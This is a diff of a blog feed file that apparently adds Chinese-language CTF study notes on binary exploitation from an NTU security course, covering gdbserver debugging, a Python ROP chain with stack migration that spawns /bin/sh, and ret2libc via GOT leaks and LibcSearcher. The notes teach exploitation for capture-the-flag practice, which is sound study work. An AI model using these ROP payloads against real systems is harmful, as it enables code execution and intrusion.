@@ -107,14 +107,14 @@
     <content><![CDATA[<p><strong>week4 shellcode rop</strong></p>
 <a id="more"></a>
 
-<h2 id="gdbserver"><a href="#gdbserver" class="headerlink" title="gdbserver"></a>gdbserver</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># in bash commandline</span></span><br><span class="line">gdbserver 127.0.0.1:4000 ./binary <span class="comment">#break在entrypoint</span></span><br><span class="line"><span class="comment"># in gdb commandline</span></span><br><span class="line">gdb ./binary</span><br><span class="line">$ target remote 127.0.0.1:4000</span><br><span class="line">$ <span class="built_in">continue</span></span><br><span class="line"><span class="comment"># 搭配ncat</span></span><br><span class="line">ncat -vc <span class="string">&#x27;gdbserver 127.0.0.1:4000 .binary&#x27;</span> -kl 127.0.0.1 5000</span><br></pre></td></tr></table></figure>
+<h1 id="gdbserver"><a href="#gdbserver" class="headerlink" title="gdbserver"></a>gdbserver</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># in bash commandline</span></span><br><span class="line">gdbserver 127.0.0.1:4000 ./binary <span class="comment">#break在entrypoint</span></span><br><span class="line"><span class="comment"># in gdb commandline</span></span><br><span class="line">gdb ./binary</span><br><span class="line">$ target remote 127.0.0.1:4000</span><br><span class="line">$ <span class="built_in">continue</span></span><br><span class="line"><span class="comment"># 搭配ncat</span></span><br><span class="line">ncat -vc <span class="string">&#x27;gdbserver 127.0.0.1:4000 .binary&#x27;</span> -kl 127.0.0.1 5000</span><br></pre></td></tr></table></figure>
 
 <p><strong>trick</strong><br>使用gdbscript attach pid</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># .gdbinit</span></span><br><span class="line"><span class="built_in">set</span> disassembly-flavor intel</span><br><span class="line">define at</span><br><span class="line">  shell <span class="built_in">echo</span> attach $(pidof -s <span class="variable">$arg0</span>) &gt; /tmp/foo.gdb</span><br><span class="line">  <span class="built_in">source</span> /tmp/foo.gdb</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
 
 <hr>
-<h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>类型包括:ret2syscall ret2fuction ret2libc</p>
-<h3 id="rop2syscall"><a href="#rop2syscall" class="headerlink" title="rop2syscall"></a>rop2syscall</h3><ul>
+<h1 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h1><p>类型包括:ret2syscall ret2text ret2libc</p>
+<h2 id="rop2syscall"><a href="#rop2syscall" class="headerlink" title="rop2syscall"></a>rop2syscall</h2><ul>
 <li>找gadget控制syscall需要的regs(eax,ebx,ecx,edx)</li>
 <li>需要int 80</li>
 </ul>
@@ -150,6 +150,67 @@
 <li>migrate后的空间要足够</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gadget1 = <span class="number">0x8048898</span></span><br><span class="line"><span class="comment"># gadget1 has gets() and leave_ret</span></span><br><span class="line"><span class="comment"># 8048898:       50                      push   eax</span></span><br><span class="line"><span class="comment"># 8048899:       e8 e2 69 00 00          call   804f280 &lt;_IO_gets&gt;</span></span><br><span class="line"><span class="comment"># 804889e:       83 c4 10                add    esp,0x10</span></span><br><span class="line"><span class="comment"># 80488a1:       90                      nop</span></span><br><span class="line"><span class="comment"># 80488a2:       c9                      leave</span></span><br><span class="line"><span class="comment"># 80488a3:       c3                      ret</span></span><br><span class="line">migration = [</span><br><span class="line">    pop_ebp_ret,</span><br><span class="line">    buf - <span class="number">4</span>,  <span class="comment">#leave会pop ebp，所以要控制到buf-4位置</span></span><br><span class="line">    pop_eax_ret,</span><br><span class="line">    buf,</span><br><span class="line">    gadget1,</span><br><span class="line">]</span><br><span class="line">rop = [</span><br><span class="line">    pop_eax_ret,</span><br><span class="line">    <span class="number">0xb</span>,</span><br><span class="line">    pop_ebx_ret,</span><br><span class="line">    buf + <span class="number">9</span> * <span class="number">4</span>,  <span class="comment">#ropchain一共有9*4bytes</span></span><br><span class="line">    pop_ecx_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_edx_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    int_0x80_ret</span><br><span class="line">]</span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span> * offset + <span class="string">&#x27;&#x27;</span>.join(map(p32, migration))</span><br><span class="line">payload2 = <span class="string">&#x27;&#x27;</span>.join(map(p32, rop)) + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NTU STCS 2016学习笔记 0x03 ROP2</title>
+    <url>/2020/08/29/ntu-stcs-2016-w5/</url>
+    <content><![CDATA[<p><strong>week5 rop from ret2text to ret2lib</strong></p>
+<a id="more"></a>
+
+<h1 id="call程序里有的function"><a href="#call程序里有的function" class="headerlink" title="call程序里有的function"></a>call程序里有的function</h1><ul>
+<li><em>跳.plt entry</em></li>
+<li><em>函数参数直接放到接下来的stack</em></li>
+<li><em>用pop-ret处理用过的参数</em></li>
+</ul>
+<p><strong>ROP call function</strong></p>
+<p><img src="w5-ropcall.png" alt="w5-ropcall"></p>
+<h1 id="使用libc里的function"><a href="#使用libc里的function" class="headerlink" title="使用libc里的function"></a>使用libc里的function</h1><ul>
+<li><em>printf,gets,puts等函数所在位置:libc.so.6</em></li>
+<li><em>直接用rop call libc 的system</em></li>
+<li><em>用条件</em><ul>
+<li><em>libc版本或者fuction的offset已知</em></li>
+<li><em>ASLR开启情况</em></li>
+</ul>
+</li>
+</ul>
+<p><strong>Dynamically Linded Elf 动态链接库相关操作</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取libc路径</span></span><br><span class="line">ldd ./binary</span><br><span class="line"><span class="comment"># 查看libc中的相对位置</span></span><br><span class="line"><span class="comment"># trick 使用 | grep &#x27; system@&#x27;来查看想找的symbol</span></span><br><span class="line">readelf -s /lib32/libc.so.6 | grep <span class="string">&#x27; system@&#x27;</span></span><br><span class="line"><span class="comment"># 指定加载的libc位置</span></span><br><span class="line">LD_LIBRARY_PATH=./path/to/libc</span><br></pre></td></tr></table></figure>
+
+<p><strong>Function Lazy Binding</strong></p>
+<p><em>library在binary执行时才加载，第一次call function时解析函数位置填入.got.plt</em></p>
+<p><strong>推算libc base addr</strong></p>
+<ul>
+<li><em>函数在libc的相对位置不变</em><ul>
+<li><em>使用readelf得知__libc_start_main和system在libc的相对位置</em></li>
+</ul>
+</li>
+<li><em>使用任意输入函数print出__libc-start_main的.got内容，推算system在内存的addr</em><ul>
+<li><em>用rop构造puts(__libc_start_main@got)</em></li>
+<li>*要leak的got entry,对应的function必须已经被call过</li>
+</ul>
+</li>
+<li><em>前提：已有或已知远端libc.so.6版本</em></li>
+</ul>
+<p><strong>Libc Data Base</strong></p>
+<ul>
+<li><p><em>已知两个function的address时可以在libcdb里找对应的版本</em></p>
+<ul>
+<li><em><del>✘网站：libcdb.com:the libc data base</del></em></li>
+<li><em>✘网站：<a href="https://libc.nullbyte.cat/">libc.nullbyte.cat</a></em></li>
+</ul>
+</li>
+<li><p><em>✔使用<a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a></em></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;fgets&quot;</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;__libc_start_main_ret&quot;</span>)  </span><br></pre></td></tr></table></figure>
+</li>
+</ul>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
         <category>CTF</category>
